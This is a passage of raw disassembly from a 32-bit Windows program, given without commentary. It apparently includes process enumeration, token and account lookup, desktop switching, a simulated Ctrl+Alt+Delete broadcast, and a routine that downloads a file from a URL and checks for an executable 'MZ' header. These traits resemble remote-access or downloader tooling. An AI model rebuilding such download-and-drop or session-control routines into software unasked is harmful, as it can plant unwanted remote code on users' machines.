  409549:	5f                   	pop    %edi
  40954a:	5e                   	pop    %esi
  40954b:	5b                   	pop    %ebx
  40954c:	8b e5                	mov    %ebp,%esp
  40954e:	5d                   	pop    %ebp
  40954f:	c2 04 00             	ret    $0x4
  409552:	b8 58 95 40 00       	mov    $0x409558,%eax
  409557:	c3                   	ret
  409558:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40955b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40955e:	5f                   	pop    %edi
  40955f:	5e                   	pop    %esi
  409560:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  409567:	5b                   	pop    %ebx
  409568:	8b e5                	mov    %ebp,%esp
  40956a:	5d                   	pop    %ebp
  40956b:	c2 04 00             	ret    $0x4
  40956e:	90                   	nop
  40956f:	90                   	nop
  409570:	83 ec 10             	sub    $0x10,%esp
  409573:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  409577:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  40957b:	8a 54 24 2c          	mov    0x2c(%esp),%dl
  40957f:	56                   	push   %esi
  409580:	6a 00                	push   $0x0
  409582:	6a 00                	push   $0x0
  409584:	6a 00                	push   $0x0
  409586:	6a 00                	push   $0x0
  409588:	89 44 24 14          	mov    %eax,0x14(%esp)
  40958c:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  409590:	88 54 24 1c          	mov    %dl,0x1c(%esp)
  409594:	ff 15 e8 b1 40 00    	call   *0x40b1e8
  40959a:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  40959e:	89 44 24 10          	mov    %eax,0x10(%esp)
  4095a2:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4095a6:	8d 54 24 04          	lea    0x4(%esp),%edx
  4095aa:	50                   	push   %eax
  4095ab:	8b 44 24 20          	mov    0x20(%esp),%eax
  4095af:	51                   	push   %ecx
  4095b0:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  4095b4:	52                   	push   %edx
  4095b5:	68 f0 94 40 00       	push   $0x4094f0
  4095ba:	50                   	push   %eax
  4095bb:	51                   	push   %ecx
  4095bc:	ff 15 74 b2 40 00    	call   *0x40b274
  4095c2:	8b 54 24 28          	mov    0x28(%esp),%edx
  4095c6:	83 c4 18             	add    $0x18,%esp
  4095c9:	8b f0                	mov    %eax,%esi
  4095cb:	6a ff                	push   $0xffffffff
  4095cd:	52                   	push   %edx
  4095ce:	ff 15 dc b1 40 00    	call   *0x40b1dc
  4095d4:	8b 44 24 10          	mov    0x10(%esp),%eax
  4095d8:	50                   	push   %eax
  4095d9:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  4095df:	8b c6                	mov    %esi,%eax
  4095e1:	5e                   	pop    %esi
  4095e2:	83 c4 10             	add    $0x10,%esp
  4095e5:	c3                   	ret
  4095e6:	90                   	nop
  4095e7:	90                   	nop
  4095e8:	90                   	nop
  4095e9:	90                   	nop
  4095ea:	90                   	nop
  4095eb:	90                   	nop
  4095ec:	90                   	nop
  4095ed:	90                   	nop
  4095ee:	90                   	nop
  4095ef:	90                   	nop
  4095f0:	53                   	push   %ebx
  4095f1:	55                   	push   %ebp
  4095f2:	56                   	push   %esi
  4095f3:	57                   	push   %edi
  4095f4:	6a 00                	push   $0x0
  4095f6:	6a 02                	push   $0x2
  4095f8:	e8 2b 13 00 00       	call   0x40a928
  4095fd:	68 28 01 00 00       	push   $0x128
  409602:	8b d8                	mov    %eax,%ebx
  409604:	e8 d7 10 00 00       	call   0x40a6e0
  409609:	83 c4 04             	add    $0x4,%esp
  40960c:	8b f0                	mov    %eax,%esi
  40960e:	56                   	push   %esi
  40960f:	53                   	push   %ebx
  409610:	c7 06 28 01 00 00    	movl   $0x128,(%esi)
  409616:	e8 07 13 00 00       	call   0x40a922
  40961b:	85 c0                	test   %eax,%eax
  40961d:	74 40                	je     0x40965f
  40961f:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  409623:	8d 7e 24             	lea    0x24(%esi),%edi
  409626:	55                   	push   %ebp
  409627:	57                   	push   %edi
  409628:	ff 15 ac b2 40 00    	call   *0x40b2ac
  40962e:	83 c4 08             	add    $0x8,%esp
  409631:	85 c0                	test   %eax,%eax
  409633:	75 08                	jne    0x40963d
  409635:	8b 46 08             	mov    0x8(%esi),%eax
  409638:	5f                   	pop    %edi
  409639:	5e                   	pop    %esi
  40963a:	5d                   	pop    %ebp
  40963b:	5b                   	pop    %ebx
  40963c:	c3                   	ret
  40963d:	56                   	push   %esi
  40963e:	53                   	push   %ebx
  40963f:	e8 d8 12 00 00       	call   0x40a91c
  409644:	85 c0                	test   %eax,%eax
  409646:	74 17                	je     0x40965f
  409648:	55                   	push   %ebp
  409649:	57                   	push   %edi
  40964a:	ff 15 cc b1 40 00    	call   *0x40b1cc
  409650:	85 c0                	test   %eax,%eax
  409652:	74 e1                	je     0x409635
  409654:	56                   	push   %esi
  409655:	53                   	push   %ebx
  409656:	e8 c1 12 00 00       	call   0x40a91c
  40965b:	85 c0                	test   %eax,%eax
  40965d:	75 e9                	jne    0x409648
  40965f:	53                   	push   %ebx
  409660:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  409666:	5f                   	pop    %edi
  409667:	5e                   	pop    %esi
  409668:	5d                   	pop    %ebp
  409669:	33 c0                	xor    %eax,%eax
  40966b:	5b                   	pop    %ebx
  40966c:	c3                   	ret
  40966d:	90                   	nop
  40966e:	90                   	nop
  40966f:	90                   	nop
  409670:	83 ec 08             	sub    $0x8,%esp
  409673:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  409677:	8d 54 24 00          	lea    0x0(%esp),%edx
  40967b:	51                   	push   %ecx
  40967c:	52                   	push   %edx
  40967d:	33 c0                	xor    %eax,%eax
  40967f:	6a 05                	push   $0x5
  409681:	6a ff                	push   $0xffffffff
  409683:	50                   	push   %eax
  409684:	89 44 24 14          	mov    %eax,0x14(%esp)
  409688:	89 44 24 18          	mov    %eax,0x18(%esp)
  40968c:	e8 07 13 00 00       	call   0x40a998
  409691:	85 c0                	test   %eax,%eax
  409693:	74 2d                	je     0x4096c2
  409695:	56                   	push   %esi
  409696:	68 00 01 00 00       	push   $0x100
  40969b:	e8 40 10 00 00       	call   0x40a6e0
  4096a0:	83 c4 04             	add    $0x4,%esp
  4096a3:	8b f0                	mov    %eax,%esi
  4096a5:	8b 44 24 04          	mov    0x4(%esp),%eax
  4096a9:	50                   	push   %eax
  4096aa:	56                   	push   %esi
  4096ab:	ff 15 d4 b0 40 00    	call   *0x40b0d4
  4096b1:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4096b5:	51                   	push   %ecx
  4096b6:	e8 d7 12 00 00       	call   0x40a992
  4096bb:	8b c6                	mov    %esi,%eax
  4096bd:	5e                   	pop    %esi
  4096be:	83 c4 08             	add    $0x8,%esp
  4096c1:	c3                   	ret
  4096c2:	33 c0                	xor    %eax,%eax
  4096c4:	83 c4 08             	add    $0x8,%esp
  4096c7:	c3                   	ret
  4096c8:	90                   	nop
  4096c9:	90                   	nop
  4096ca:	90                   	nop
  4096cb:	90                   	nop
  4096cc:	90                   	nop
  4096cd:	90                   	nop
  4096ce:	90                   	nop
  4096cf:	90                   	nop
  4096d0:	55                   	push   %ebp
  4096d1:	8b ec                	mov    %esp,%ebp
  4096d3:	6a ff                	push   $0xffffffff
  4096d5:	68 f0 b4 40 00       	push   $0x40b4f0
  4096da:	68 62 a7 40 00       	push   $0x40a762
  4096df:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4096e5:	50                   	push   %eax
  4096e6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4096ed:	81 ec 40 01 00 00    	sub    $0x140,%esp
  4096f3:	53                   	push   %ebx
  4096f4:	56                   	push   %esi
  4096f5:	57                   	push   %edi
  4096f6:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4096f9:	68 ac e6 40 00       	push   $0x40e6ac
  4096fe:	e8 ed fe ff ff       	call   0x4095f0
  409703:	83 c4 04             	add    $0x4,%esp
  409706:	33 f6                	xor    %esi,%esi
  409708:	3b c6                	cmp    %esi,%eax
  40970a:	75 13                	jne    0x40971f
  40970c:	33 c0                	xor    %eax,%eax
  40970e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  409711:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  409718:	5f                   	pop    %edi
  409719:	5e                   	pop    %esi
  40971a:	5b                   	pop    %ebx
  40971b:	8b e5                	mov    %ebp,%esp
  40971d:	5d                   	pop    %ebp
  40971e:	c3                   	ret
  40971f:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  409722:	89 75 d0             	mov    %esi,-0x30(%ebp)
  409725:	89 75 d8             	mov    %esi,-0x28(%ebp)
  409728:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  40972b:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40972e:	50                   	push   %eax
  40972f:	56                   	push   %esi
  409730:	68 00 04 00 00       	push   $0x400
  409735:	ff 15 6c b1 40 00    	call   *0x40b16c
  40973b:	8b d8                	mov    %eax,%ebx
  40973d:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  409740:	3b de                	cmp    %esi,%ebx
  409742:	0f 84 b7 00 00 00    	je     0x4097ff
  409748:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40974b:	50                   	push   %eax
  40974c:	6a 08                	push   $0x8
  40974e:	53                   	push   %ebx
  40974f:	ff 15 58 b0 40 00    	call   *0x40b058
  409755:	89 45 dc             	mov    %eax,-0x24(%ebp)
  409758:	3b c6                	cmp    %esi,%eax
  40975a:	0f 84 9f 00 00 00    	je     0x4097ff
  409760:	89 75 c8             	mov    %esi,-0x38(%ebp)
  409763:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  409766:	51                   	push   %ecx
  409767:	56                   	push   %esi
  409768:	56                   	push   %esi
  409769:	6a 01                	push   $0x1
  40976b:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40976e:	52                   	push   %edx
  40976f:	8b 3d 3c b0 40 00    	mov    0x40b03c,%edi
  409775:	ff d7                	call   *%edi
  409777:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40977a:	8b 45 c8             	mov    -0x38(%ebp),%eax
  40977d:	85 c0                	test   %eax,%eax
  40977f:	76 7e                	jbe    0x4097ff
  409781:	50                   	push   %eax
  409782:	e8 59 0f 00 00       	call   0x40a6e0
  409787:	83 c4 04             	add    $0x4,%esp
  40978a:	8b f0                	mov    %eax,%esi
  40978c:	89 b5 b8 fe ff ff    	mov    %esi,-0x148(%ebp)
  409792:	89 75 d8             	mov    %esi,-0x28(%ebp)
  409795:	8d 45 c8             	lea    -0x38(%ebp),%eax
  409798:	50                   	push   %eax
  409799:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40979c:	51                   	push   %ecx
  40979d:	56                   	push   %esi
  40979e:	6a 01                	push   $0x1
  4097a0:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4097a3:	52                   	push   %edx
  4097a4:	ff d7                	call   *%edi
  4097a6:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4097a9:	85 c0                	test   %eax,%eax
  4097ab:	74 52                	je     0x4097ff
  4097ad:	c7 85 c0 fe ff ff 04 	movl   $0x104,-0x140(%ebp)
  4097b4:	01 00 00 
  4097b7:	c7 85 bc fe ff ff 00 	movl   $0x100,-0x144(%ebp)
  4097be:	01 00 00 
  4097c1:	68 00 01 00 00       	push   $0x100
  4097c6:	e8 15 0f 00 00       	call   0x40a6e0
  4097cb:	83 c4 04             	add    $0x4,%esp
  4097ce:	89 85 b4 fe ff ff    	mov    %eax,-0x14c(%ebp)
  4097d4:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4097d7:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4097da:	51                   	push   %ecx
  4097db:	8d 95 c0 fe ff ff    	lea    -0x140(%ebp),%edx
  4097e1:	52                   	push   %edx
  4097e2:	8d 8d c4 fe ff ff    	lea    -0x13c(%ebp),%ecx
  4097e8:	51                   	push   %ecx
  4097e9:	8d 95 bc fe ff ff    	lea    -0x144(%ebp),%edx
  4097ef:	52                   	push   %edx
  4097f0:	50                   	push   %eax
  4097f1:	8b 06                	mov    (%esi),%eax
  4097f3:	50                   	push   %eax
  4097f4:	6a 00                	push   $0x0
  4097f6:	ff 15 40 b0 40 00    	call   *0x40b040
  4097fc:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4097ff:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  409806:	e8 06 00 00 00       	call   0x409811
  40980b:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
  40980e:	8b 75 d8             	mov    -0x28(%ebp),%esi
  409811:	85 db                	test   %ebx,%ebx
  409813:	74 07                	je     0x40981c
  409815:	53                   	push   %ebx
  409816:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  40981c:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40981f:	85 c0                	test   %eax,%eax
  409821:	74 07                	je     0x40982a
  409823:	50                   	push   %eax
  409824:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  40982a:	85 f6                	test   %esi,%esi
  40982c:	74 09                	je     0x409837
  40982e:	56                   	push   %esi
  40982f:	e8 b2 0e 00 00       	call   0x40a6e6
  409834:	83 c4 04             	add    $0x4,%esp
  409837:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40983a:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40983d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  409840:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  409847:	5f                   	pop    %edi
  409848:	5e                   	pop    %esi
  409849:	5b                   	pop    %ebx
  40984a:	8b e5                	mov    %ebp,%esp
  40984c:	5d                   	pop    %ebp
  40984d:	c3                   	ret
  40984e:	90                   	nop
  40984f:	90                   	nop
  409850:	81 ec 9c 00 00 00    	sub    $0x9c,%esp
  409856:	56                   	push   %esi
  409857:	8b 35 f8 b0 40 00    	mov    0x40b0f8,%esi
  40985d:	57                   	push   %edi
  40985e:	b9 27 00 00 00       	mov    $0x27,%ecx
  409863:	33 c0                	xor    %eax,%eax
  409865:	8d 7c 24 08          	lea    0x8(%esp),%edi
  409869:	f3 ab                	rep stos %eax,%es:(%edi)
  40986b:	8d 44 24 08          	lea    0x8(%esp),%eax
  40986f:	c7 44 24 08 9c 00 00 	movl   $0x9c,0x8(%esp)
  409876:	00 
  409877:	50                   	push   %eax
  409878:	ff d6                	call   *%esi
  40987a:	85 c0                	test   %eax,%eax
  40987c:	75 1c                	jne    0x40989a
  40987e:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  409882:	c7 44 24 08 94 00 00 	movl   $0x94,0x8(%esp)
  409889:	00 
  40988a:	51                   	push   %ecx
  40988b:	ff d6                	call   *%esi
  40988d:	85 c0                	test   %eax,%eax
  40988f:	75 09                	jne    0x40989a
  409891:	5f                   	pop    %edi
  409892:	5e                   	pop    %esi
  409893:	81 c4 9c 00 00 00    	add    $0x9c,%esp
  409899:	c3                   	ret
  40989a:	83 7c 24 0c 05       	cmpl   $0x5,0xc(%esp)
  40989f:	75 16                	jne    0x4098b7
  4098a1:	8b 44 24 10          	mov    0x10(%esp),%eax
  4098a5:	85 c0                	test   %eax,%eax
  4098a7:	75 0e                	jne    0x4098b7
  4098a9:	e8 22 fe ff ff       	call   0x4096d0
  4098ae:	5f                   	pop    %edi
  4098af:	5e                   	pop    %esi
  4098b0:	81 c4 9c 00 00 00    	add    $0x9c,%esp
  4098b6:	c3                   	ret
  4098b7:	e8 b4 fd ff ff       	call   0x409670
  4098bc:	5f                   	pop    %edi
  4098bd:	5e                   	pop    %esi
  4098be:	81 c4 9c 00 00 00    	add    $0x9c,%esp
  4098c4:	c3                   	ret
  4098c5:	90                   	nop
  4098c6:	90                   	nop
  4098c7:	90                   	nop
  4098c8:	90                   	nop
  4098c9:	90                   	nop
  4098ca:	90                   	nop
  4098cb:	90                   	nop
  4098cc:	90                   	nop
  4098cd:	90                   	nop
  4098ce:	90                   	nop
  4098cf:	90                   	nop
  4098d0:	81 ec 08 02 00 00    	sub    $0x208,%esp
  4098d6:	53                   	push   %ebx
  4098d7:	55                   	push   %ebp
  4098d8:	56                   	push   %esi
  4098d9:	57                   	push   %edi
  4098da:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4098e1:	00 
  4098e2:	ff 15 d0 b1 40 00    	call   *0x40b1d0
  4098e8:	50                   	push   %eax
  4098e9:	ff 15 20 b3 40 00    	call   *0x40b320
  4098ef:	8b d8                	mov    %eax,%ebx
  4098f1:	b9 40 00 00 00       	mov    $0x40,%ecx
  4098f6:	33 c0                	xor    %eax,%eax
  4098f8:	8d 7c 24 18          	lea    0x18(%esp),%edi
  4098fc:	8b 2d 24 b3 40 00    	mov    0x40b324,%ebp
  409902:	f3 ab                	rep stos %eax,%es:(%edi)
  409904:	8d 44 24 14          	lea    0x14(%esp),%eax
  409908:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  40990c:	50                   	push   %eax
  40990d:	68 00 01 00 00       	push   $0x100
  409912:	51                   	push   %ecx
  409913:	6a 02                	push   $0x2
  409915:	53                   	push   %ebx
  409916:	ff d5                	call   *%ebp
  409918:	68 00 00 00 02       	push   $0x2000000
  40991d:	6a 00                	push   $0x0
  40991f:	6a 00                	push   $0x0
  409921:	ff 15 28 b3 40 00    	call   *0x40b328
  409927:	8b f0                	mov    %eax,%esi
  409929:	b9 40 00 00 00       	mov    $0x40,%ecx
  40992e:	33 c0                	xor    %eax,%eax
  409930:	8d bc 24 18 01 00 00 	lea    0x118(%esp),%edi
  409937:	8d 54 24 14          	lea    0x14(%esp),%edx
  40993b:	f3 ab                	rep stos %eax,%es:(%edi)
  40993d:	52                   	push   %edx
  40993e:	8d 84 24 1c 01 00 00 	lea    0x11c(%esp),%eax
  409945:	68 00 01 00 00       	push   $0x100
  40994a:	50                   	push   %eax
  40994b:	6a 02                	push   $0x2
  40994d:	56                   	push   %esi
  40994e:	ff d5                	call   *%ebp
  409950:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  409954:	8d 94 24 18 01 00 00 	lea    0x118(%esp),%edx
  40995b:	51                   	push   %ecx
  40995c:	52                   	push   %edx
  40995d:	ff 15 cc b1 40 00    	call   *0x40b1cc
  409963:	85 c0                	test   %eax,%eax
  409965:	74 0e                	je     0x409975
  409967:	56                   	push   %esi
  409968:	ff 15 90 b3 40 00    	call   *0x40b390
  40996e:	bd 01 00 00 00       	mov    $0x1,%ebp
  409973:	eb 04                	jmp    0x409979
  409975:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  409979:	8b 3d 30 b3 40 00    	mov    0x40b330,%edi
  40997f:	53                   	push   %ebx
  409980:	ff d7                	call   *%edi
  409982:	56                   	push   %esi
  409983:	ff d7                	call   *%edi
  409985:	33 c0                	xor    %eax,%eax
  409987:	5f                   	pop    %edi
  409988:	85 ed                	test   %ebp,%ebp
  40998a:	5e                   	pop    %esi
  40998b:	5d                   	pop    %ebp
  40998c:	0f 95 c0             	setne  %al
  40998f:	5b                   	pop    %ebx
  409990:	81 c4 08 02 00 00    	add    $0x208,%esp
  409996:	c3                   	ret
  409997:	90                   	nop
  409998:	90                   	nop
  409999:	90                   	nop
  40999a:	90                   	nop
  40999b:	90                   	nop
  40999c:	90                   	nop
  40999d:	90                   	nop
  40999e:	90                   	nop
  40999f:	90                   	nop
  4099a0:	81 ec 04 01 00 00    	sub    $0x104,%esp
  4099a6:	56                   	push   %esi
  4099a7:	57                   	push   %edi
  4099a8:	ff 15 d0 b1 40 00    	call   *0x40b1d0
  4099ae:	50                   	push   %eax
  4099af:	ff 15 20 b3 40 00    	call   *0x40b320
  4099b5:	8b b4 24 10 01 00 00 	mov    0x110(%esp),%esi
  4099bc:	8b f8                	mov    %eax,%edi
  4099be:	8d 44 24 08          	lea    0x8(%esp),%eax
  4099c2:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4099c6:	50                   	push   %eax
  4099c7:	68 00 01 00 00       	push   $0x100
  4099cc:	51                   	push   %ecx
  4099cd:	6a 02                	push   $0x2
  4099cf:	56                   	push   %esi
  4099d0:	ff 15 24 b3 40 00    	call   *0x40b324
  4099d6:	85 c0                	test   %eax,%eax
  4099d8:	75 09                	jne    0x4099e3
  4099da:	5f                   	pop    %edi
  4099db:	5e                   	pop    %esi
  4099dc:	81 c4 04 01 00 00    	add    $0x104,%esp
  4099e2:	c3                   	ret
  4099e3:	56                   	push   %esi
  4099e4:	ff 15 90 b3 40 00    	call   *0x40b390
  4099ea:	85 c0                	test   %eax,%eax
  4099ec:	75 09                	jne    0x4099f7
  4099ee:	5f                   	pop    %edi
  4099ef:	5e                   	pop    %esi
  4099f0:	81 c4 04 01 00 00    	add    $0x104,%esp
  4099f6:	c3                   	ret
  4099f7:	57                   	push   %edi
  4099f8:	ff 15 30 b3 40 00    	call   *0x40b330
  4099fe:	5f                   	pop    %edi
  4099ff:	b8 01 00 00 00       	mov    $0x1,%eax
  409a04:	5e                   	pop    %esi
  409a05:	81 c4 04 01 00 00    	add    $0x104,%esp
  409a0b:	c3                   	ret
  409a0c:	90                   	nop
  409a0d:	90                   	nop
  409a0e:	90                   	nop
  409a0f:	90                   	nop
  409a10:	8b 44 24 04          	mov    0x4(%esp),%eax
  409a14:	56                   	push   %esi
  409a15:	68 cf 01 00 40       	push   $0x400001cf
  409a1a:	6a 00                	push   $0x0
  409a1c:	85 c0                	test   %eax,%eax
  409a1e:	6a 00                	push   $0x0
  409a20:	74 09                	je     0x409a2b
  409a22:	50                   	push   %eax
  409a23:	ff 15 1c b3 40 00    	call   *0x40b31c
  409a29:	eb 06                	jmp    0x409a31
  409a2b:	ff 15 28 b3 40 00    	call   *0x40b328
  409a31:	8b f0                	mov    %eax,%esi
  409a33:	85 f6                	test   %esi,%esi
  409a35:	75 02                	jne    0x409a39
  409a37:	5e                   	pop    %esi
  409a38:	c3                   	ret
  409a39:	56                   	push   %esi
  409a3a:	e8 61 ff ff ff       	call   0x4099a0
  409a3f:	83 c4 04             	add    $0x4,%esp
  409a42:	85 c0                	test   %eax,%eax
  409a44:	75 0b                	jne    0x409a51
  409a46:	56                   	push   %esi
  409a47:	ff 15 30 b3 40 00    	call   *0x40b330
  409a4d:	33 c0                	xor    %eax,%eax
  409a4f:	5e                   	pop    %esi
  409a50:	c3                   	ret
  409a51:	b8 01 00 00 00       	mov    $0x1,%eax
  409a56:	5e                   	pop    %esi
  409a57:	c3                   	ret
  409a58:	90                   	nop
  409a59:	90                   	nop
  409a5a:	90                   	nop
  409a5b:	90                   	nop
  409a5c:	90                   	nop
  409a5d:	90                   	nop
  409a5e:	90                   	nop
  409a5f:	90                   	nop
  409a60:	56                   	push   %esi
  409a61:	ff 15 d0 b1 40 00    	call   *0x40b1d0
  409a67:	50                   	push   %eax
  409a68:	ff 15 20 b3 40 00    	call   *0x40b320
  409a6e:	68 bc e6 40 00       	push   $0x40e6bc
  409a73:	8b f0                	mov    %eax,%esi
  409a75:	e8 96 ff ff ff       	call   0x409a10
  409a7a:	83 c4 04             	add    $0x4,%esp
  409a7d:	85 c0                	test   %eax,%eax
  409a7f:	75 02                	jne    0x409a83
  409a81:	5e                   	pop    %esi
  409a82:	c3                   	ret
  409a83:	68 03 00 2e 00       	push   $0x2e0003
  409a88:	6a 00                	push   $0x0
  409a8a:	68 12 03 00 00       	push   $0x312
  409a8f:	68 ff ff 00 00       	push   $0xffff
  409a94:	ff 15 18 b3 40 00    	call   *0x40b318
  409a9a:	85 f6                	test   %esi,%esi
  409a9c:	74 09                	je     0x409aa7
  409a9e:	56                   	push   %esi
  409a9f:	e8 fc fe ff ff       	call   0x4099a0
  409aa4:	83 c4 04             	add    $0x4,%esp
  409aa7:	b8 01 00 00 00       	mov    $0x1,%eax
  409aac:	5e                   	pop    %esi
  409aad:	c3                   	ret
  409aae:	90                   	nop
  409aaf:	90                   	nop
  409ab0:	81 ec 14 04 00 00    	sub    $0x414,%esp
  409ab6:	53                   	push   %ebx
  409ab7:	55                   	push   %ebp
  409ab8:	56                   	push   %esi
  409ab9:	33 ed                	xor    %ebp,%ebp
  409abb:	57                   	push   %edi
  409abc:	55                   	push   %ebp
  409abd:	55                   	push   %ebp
  409abe:	55                   	push   %ebp
  409abf:	be 01 00 00 00       	mov    $0x1,%esi
  409ac4:	55                   	push   %ebp
  409ac5:	68 c8 e6 40 00       	push   $0x40e6c8
  409aca:	89 6c 24 24          	mov    %ebp,0x24(%esp)
  409ace:	89 6c 24 30          	mov    %ebp,0x30(%esp)
  409ad2:	89 74 24 28          	mov    %esi,0x28(%esp)
  409ad6:	ff 15 b0 b3 40 00    	call   *0x40b3b0
  409adc:	8b f8                	mov    %eax,%edi
  409ade:	3b fd                	cmp    %ebp,%edi
  409ae0:	89 7c 24 20          	mov    %edi,0x20(%esp)
  409ae4:	75 0d                	jne    0x409af3
  409ae6:	5f                   	pop    %edi
  409ae7:	5e                   	pop    %esi
  409ae8:	5d                   	pop    %ebp
  409ae9:	32 c0                	xor    %al,%al
  409aeb:	5b                   	pop    %ebx
  409aec:	81 c4 14 04 00 00    	add    $0x414,%esp
  409af2:	c3                   	ret
  409af3:	8b 84 24 28 04 00 00 	mov    0x428(%esp),%eax
  409afa:	55                   	push   %ebp
  409afb:	68 00 00 00 80       	push   $0x80000000
  409b00:	55                   	push   %ebp
  409b01:	55                   	push   %ebp
  409b02:	50                   	push   %eax
  409b03:	57                   	push   %edi
  409b04:	ff 15 a4 b3 40 00    	call   *0x40b3a4
  409b0a:	8b d8                	mov    %eax,%ebx
  409b0c:	3b dd                	cmp    %ebp,%ebx
  409b0e:	75 0d                	jne    0x409b1d
  409b10:	5f                   	pop    %edi
  409b11:	5e                   	pop    %esi
  409b12:	5d                   	pop    %ebp
  409b13:	32 c0                	xor    %al,%al
  409b15:	5b                   	pop    %ebx
  409b16:	81 c4 14 04 00 00    	add    $0x414,%esp
  409b1c:	c3                   	ret
  409b1d:	8b 8c 24 2c 04 00 00 	mov    0x42c(%esp),%ecx
  409b24:	55                   	push   %ebp
  409b25:	55                   	push   %ebp
  409b26:	6a 02                	push   $0x2
  409b28:	55                   	push   %ebp
  409b29:	55                   	push   %ebp
  409b2a:	68 00 00 00 40       	push   $0x40000000
  409b2f:	51                   	push   %ecx
  409b30:	ff 15 40 b1 40 00    	call   *0x40b140
  409b36:	83 f8 ff             	cmp    $0xffffffff,%eax
  409b39:	89 44 24 18          	mov    %eax,0x18(%esp)
  409b3d:	74 70                	je     0x409baf
  409b3f:	8b 2d a8 b3 40 00    	mov    0x40b3a8,%ebp
  409b45:	b9 00 01 00 00       	mov    $0x100,%ecx
  409b4a:	33 c0                	xor    %eax,%eax
  409b4c:	8d 7c 24 24          	lea    0x24(%esp),%edi
  409b50:	8d 54 24 10          	lea    0x10(%esp),%edx
  409b54:	f3 ab                	rep stos %eax,%es:(%edi)
  409b56:	52                   	push   %edx
  409b57:	8d 44 24 28          	lea    0x28(%esp),%eax
  409b5b:	68 00 04 00 00       	push   $0x400
  409b60:	50                   	push   %eax
  409b61:	53                   	push   %ebx
  409b62:	ff d5                	call   *%ebp
  409b64:	85 f6                	test   %esi,%esi
  409b66:	74 09                	je     0x409b71
  409b68:	66 81 7c 24 24 4d 5a 	cmpw   $0x5a4d,0x24(%esp)
  409b6f:	75 27                	jne    0x409b98
  409b71:	8b 54 24 10          	mov    0x10(%esp),%edx
  409b75:	33 f6                	xor    %esi,%esi
  409b77:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  409b7b:	56                   	push   %esi
  409b7c:	51                   	push   %ecx
  409b7d:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  409b81:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  409b85:	52                   	push   %edx
  409b86:	50                   	push   %eax
  409b87:	51                   	push   %ecx
  409b88:	ff 15 4c b1 40 00    	call   *0x40b14c
  409b8e:	8b 44 24 10          	mov    0x10(%esp),%eax
  409b92:	85 c0                	test   %eax,%eax
  409b94:	76 0a                	jbe    0x409ba0
  409b96:	eb ad                	jmp    0x409b45
  409b98:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  409b9f:	00 
  409ba0:	8b 54 24 18          	mov    0x18(%esp),%edx
  409ba4:	52                   	push   %edx
  409ba5:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  409bab:	8b 7c 24 20          	mov    0x20(%esp),%edi
  409baf:	8b 35 ac b3 40 00    	mov    0x40b3ac,%esi
  409bb5:	53                   	push   %ebx
  409bb6:	ff d6                	call   *%esi
  409bb8:	57                   	push   %edi
  409bb9:	ff d6                	call   *%esi
  409bbb:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  409bbf:	33 c0                	xor    %eax,%eax
  409bc1:	5f                   	pop    %edi
  409bc2:	5e                   	pop    %esi
  409bc3:	85 c9                	test   %ecx,%ecx
  409bc5:	5d                   	pop    %ebp
  409bc6:	5b                   	pop    %ebx
  409bc7:	0f 95 c0             	setne  %al
  409bca:	81 c4 14 04 00 00    	add    $0x414,%esp
  409bd0:	c3                   	ret
  409bd1:	90                   	nop
  409bd2:	90                   	nop
  409bd3:	90                   	nop
  409bd4:	90                   	nop
  409bd5:	90                   	nop
  409bd6:	90                   	nop
  409bd7:	90                   	nop
  409bd8:	90                   	nop
  409bd9:	90                   	nop
  409bda:	90                   	nop
  409bdb:	90                   	nop
  409bdc:	90                   	nop
  409bdd:	90                   	nop
  409bde:	90                   	nop
  409bdf:	90                   	nop
  409be0:	56                   	push   %esi
  409be1:	6a 00                	push   $0x0
  409be3:	8b f1                	mov    %ecx,%esi
  409be5:	6a 00                	push   $0x0
